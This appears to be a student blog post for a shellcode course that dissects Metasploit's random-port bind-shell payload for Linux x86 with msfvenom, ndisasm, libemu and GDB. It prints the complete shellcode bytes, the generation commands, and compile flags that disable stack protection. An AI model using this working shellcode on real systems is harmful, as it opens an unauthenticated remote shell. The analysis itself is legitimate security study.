@@ -1,0 +1,382 @@
+<br><div id="particles-js-background" class="container" ng-controller="mainController"> </div><div id="overlay" class="container" ng-controller="mainController"><br><br>
+
+<h1> Assignment 5: Shellcode functionality</h1><br>
+<br>
+- Take up at leat 3 shellcode samples created using Msfvenom for linux/x86<br>
+<br>
+- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode<br>
+<br>
+- Present your analysis<br>
+<br>
+<br>
+<h2>Download from Github</h2><br>
+Link: <a href="https://github.com/ricardojoserf/slae32/tree/master/a5_Shellcode_Functionality">https://github.com/ricardojoserf/slae32/tree/master/a5_Shellcode_Functionality</a>
+<br>
+<br>
+<br>
+<h2> List of payloads</h2><br>
+<br>
+Payloads studied:<br>
+<br>
+- Payload linux/x86/adduser<br>
+<br>
+- Payload linux/x86/read_file<br>
+<br>
+- Payload linux/x86/shell_bind_tcp_random_port<br>
+<br>
+<br>
+<br>
+<br>
+<h2> 5.3 Payload <i>linux/x86/shell_bind_tcp_random_port</i></h2>
+<br>
+<h3> Check options</h3>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
+</code><br>
+<img src="visual/images/slae/5/randbind/1.png"><br>
+<br>
+<img src="visual/images/slae/5/randbind/2.png"><br>
+<br>
+There is not any basic option in this case.<br>
+<br>
+For this study we will use the basic command:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
+</code><br>
+<h3> One-liner for getting shellcode </h3>
+<br>
+The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | grep '"' | sed -e 's/\"//g' | paste -sd "" -
+</code><br>
+Using it, we get the shellcode we will use for the study of the payload:<br>
+<br>
+<img src="visual/images/slae/5/randbind/3.png"><br>
+<br>
+<h3> Ndisasm</h3>
+<br>
+Before studying the syscalls, the .nasm code is extracted using Ndisasm:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | ndisasm -u -
+</code><br>
+<br>
+Or a little quicker:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;
+">echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
+</code><br>
+<img src="visual/images/slae/5/randbind/6.png"><br>
+<br>
+Using awk it is possible to get only the part we want and create a .nasm file:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -e "section .text\nglobal _start \n_start:" > 3.nasm
+
+echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
+</code><br>
+<img src="visual/images/slae/5/randbind/7.png"><br>
+<br>
+<br>
+<br>
+<h3> Libemu</h3>
+<br>
+In this case Libemu works correctly:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
+</code><br>
+<img src="visual/images/slae/5/randbind/4.png"><br>
+<br>
+We get the next output:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">int socket (<br>
+int domain = 2;<br>
+int type = 1;<br>
+int protocol = 0;<br>
+) = 14;<br>
+int listen (<br>
+int s = 14;<br>
+int backlog = 0;<br>
+) = 0;<br>
+int accept (<br>
+int sockfd = 14;<br>
+sockaddr_in * addr = 0x00000000 =><br>
+none;<br>
+int addrlen = 0x00000002 =><br>
+none;<br>
+) = 19;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 14;<br>
+) = 14;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 13;<br>
+) = 13;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 12;<br>
+) = 12;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 11;<br>
+) = 11;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 10;<br>
+) = 10;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 9;<br>
+) = 9;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 8;<br>
+) = 8;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 7;<br>
+) = 7;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 6;<br>
+) = 6;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 5;<br>
+) = 5;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 4;<br>
+) = 4;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 3;<br>
+) = 3;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 2;<br>
+) = 2;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 1;<br>
+) = 1;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 0;<br>
+) = 0;<br>
+int execve (<br>
+const char * dateiname = 0x00416fb6 =><br>
+= "/bin//sh";<br>
+const char * argv[] = [<br>
+= 0xffffffff =><br>
+none;<br>
+];<br>
+const char * envp[] = 0x00000000 =><br>
+none;<br>
+) = 0;<br>
+
+</code><br>
+Finally the png picture is created using:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">dot randbind.dot -T png -o randbind.png
+</code><br>
+<img src="visual/images/slae/5/randbind/5.png"><br>
+<br>
+<br>
+<h3> Studying the syscalls</h3>
+<br>
+Given we have the nasm code, the first thing to do will be studying the different syscalls. We can do this checking the lines containing "int 0x80" in the code. <br>
+<br>
+In this case we have five syscalls:<br>
+<br>
+<img src="visual/images/slae/5/randbind/8.png"><br>
+<br>
+After checking the <i>/usr/include/i386-linux-gnu/asm/unistd_32.h</i> file, the syscalls seem different to the ones we got using Libemu:<br>
+<br>
+Libeu states the list of syscalls is:<br>
+<br>
+- Syscall 1: socket() - <i>It creates  an  endpoint  for communication and returns a file descriptor that refers to that endpoint.</i><br>
+<br>
+- Syscall 2: listen() - <i>It marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection  requests using accept(2).</i><br>
+<br>
+- Syscall 3: accept() - <i>It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.</i><br>
+<br>
+- Syscall 4: dup2() - <i>It system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor for the new descriptor.</i><br>
+<br>
+- Syscall 5: execve() - <i>It executes  the  program pointed to by filename</i>.<br>
+<br>
+<br>
+The nasm file states the list of syscalls is:<br>
+<br>
+- Syscall 1 (Value 0x66 or 102 in decimal): socketcall() - <i>It is a common kernel entry point for the socket system calls</i><br>
+<br>
+- Syscall 2 (Value 0x66 or 102 in decimal): socketcall() - <i>It is a common kernel entry point for the socket system calls</i><br>
+<br>
+- Syscall 3 (Value 0x66 or 102 in decimal): socketcall() - <i>It is a common kernel entry point for the socket system calls</i><br>
+<br>
+- Syscall 4 (Value 03f or 63 in decimal): dup2() - <i>It system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused file descriptor for the new descriptor.</i><br>
+<br>
+- Syscall 5 (Value 0xb or 11 in decimal): execve() - <i>It executes  the  program pointed to by filename</i>.<br>
+<br>
+So Libemu interprets which is the specific socket call in the first three syscalls.<br>
+<br>
+<img src="visual/images/slae/5/randbind/9.png"><br>
+<br>
+<br>
+<br>
+<h3> Generating the executable</h3>
+<br>
+In this third case, it is possible to compile the NASM code and generate a working executable, but it crashes after connecting to the port:<br>
+<br>
+<img src="visual/images/slae/5/randbind/22.png"><br>
+<br>
+So again, itt is necessary to use the <i>shellcode.c</i> file:<br>
+<br>
+<img src="visual/images/slae/5/randbind/23.png"><br>
+<br>
+It is compiled:<br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">gcc -fno-stack-protector -z execstack shellcode.c -o 3
+</code><br>
+An executable named "3" gets generated. It is possible to execute it and check that it works correctly:<br>
+<br>
+<img src="visual/images/slae/5/randbind/24.png"><br>
+<br>
+<br>
+Also it is possible to look for interesting strings like this one:<br>
+<br>
+<img src="visual/images/slae/5/randbind/11.png"><br>
+<br>
+<br>
+<h3> Study with GDB</h3>
+<br>
+We attach the executable in quiet mode, set the disassembly flavor, define the "hook-stop" function, run the program and stop in the main function:<br>
+<br>
+<img src="visual/images/slae/5/randbind/12.png"><br>
+<br>
+Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).<br>
+<br>
+We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode. All the shellcode with the five syscalls can be read:<br>
+<br>
+<img src="visual/images/slae/5/randbind/12_5.png"><br>
+<br>
+We set breakpoint in every one of them:<br>
+<br>
+<img src="visual/images/slae/5/randbind/14.png"><br>
+<br>
+<br>
+<h4> Syscall 1</h4><br>
+We reach the first syscall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/15.png"><br>
+<br>
+We read the man page of socketcall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
+<br>
+And then the values are:<br>
+<br>
+- EAX = 102 => Syscall is socketcall()<br>
+<br>
+- EBX = 1 => Option "SOCKET"<br>
+<br>
+- ECX = -1073745200 => The stack address containing the pushed values "0x2" (<i>domain</i> is AF_INET), "0x1" (<i>type</i> is SOCK_STREAM) and "0x0" (<i>protocol</i> is not set):<br>
+<br>
+<img src="visual/images/slae/5/randbind/31.png"><br>
+<br>
+<br>
+<br>
+<h4> Syscall 2</h4><br>
+We reach the second syscall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/17.png"><br>
+<br>
+We read the man page of socketcall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
+<br>
+And then the values are:<br>
+<br>
+- EAX = 102 => Syscall is socketcall()<br>
+<br>
+- EBX = 4 => Option "LISTEN"<br>
+<br>
+- ECX = -1073745208 => The stack address containing the values "0x3" (<i>s</i>, the file descriptor) and "0x0" (<i>backlog</i>, which defines the maximum length to which the queue of pending connections for sockfd may grow.)<br>
+<br>
+<img src="visual/images/slae/5/randbind/32.png"><br>
+<br>
+<br>
+<br>
+<h4> Syscall 3</h4><br>
+We reach the third syscall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/18.png"><br>
+<br>
+We read the man page of socketcall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/16.png"><br>
+<br>
+And then the values are:<br>
+<br>
+- EAX = 102 => Syscall is socketcall()<br>
+<br>
+- EBX = 5 => Option "ACCEPT"<br>
+<br>
+- ECX = -1073745208 => The stack address containing the values "0x3" (<i>socketfd</i>, the file descriptor), "0X0" (<i>addr</i>, so the address is '0.0.0.0') and "0x2" (<i>addrlen</i>, so the length of the address is 32 bits)<br>
+<br>
+<img src="visual/images/slae/5/randbind/33.png"><br>
+<br>
+<br>
+Now, it is necessary to check which is the port opened and connect to it:<br>
+<br>
+<img src="visual/images/slae/5/randbind/19.png"><br>
+<br>
+<br>
+<h4> Syscall 4</h4><br>
+Then, we reach the fourth syscall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/20.png"><br>
+<br>
+We read the man page of dup2:<br>
+<br>
+<img src="visual/images/slae/5/randbind/25.png"><br>
+<br>
+And then the values are:<br>
+<br>
+- EAX = 63 => Syscall is dup2()<br>
+<br>
+- EBX = 4 => Old file descriptor<br>
+<br>
+- ECX = 3 => New file descriptor<br>
+<br>
+Later the breakpoint is reached again only changing the ECX value to 2, 1 and then 0. <br>
+<br>
+<br>
+<h4> Syscall 5</h4><br>
+We reach the fifth syscall:<br>
+<br>
+<img src="visual/images/slae/5/randbind/27.png"><br>
+<br>
+We read the man page of execve:<br>
+<br>
+<img src="visual/images/slae/5/randbind/26.png"><br>
+<br>
+And then the values are:<br>
+<br>
+- EAX = 11 => Syscall is execve()<br>
+<br>
+- EBX = -1073745212 => The stack address containing the values "0xbfffff20" and "0xb7fd70bb" (<i>dateiname</i> or the /bin/sh address)<br>
+<br>
+- ECX = 0 => The value of <i>argv[]</i>, which is none in this case.<br>
+<br>
+- EDX = 0 => Tha value of <i>envp[]</i>, which is none in this case.<br>
+<br>
+<br>
+<h3> Update/correct NASM file</h3>
+<br>
+Now we can update the nasm code adding the necessary jump:<br>
+<br>
+<img src="visual/images/slae/5/randbind/28.png"><br>
+<br>
+Finally we can compile the nasm file and check it works correctly:<br>
+<br>
+<img src="visual/images/slae/5/randbind/29.png"><br>
+<br>
+<img src="visual/images/slae/5/randbind/30.png"><br>
+<br>
+<br>
+<br>
+<h2> Note</h2><br>
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a><br>
+<br>
+Student ID: SLAE - 1433<br>
+<br><br><br><br><script src="visual/particles/particles.js"></script><script src="visual/particles/particles_style_2.js"></script>
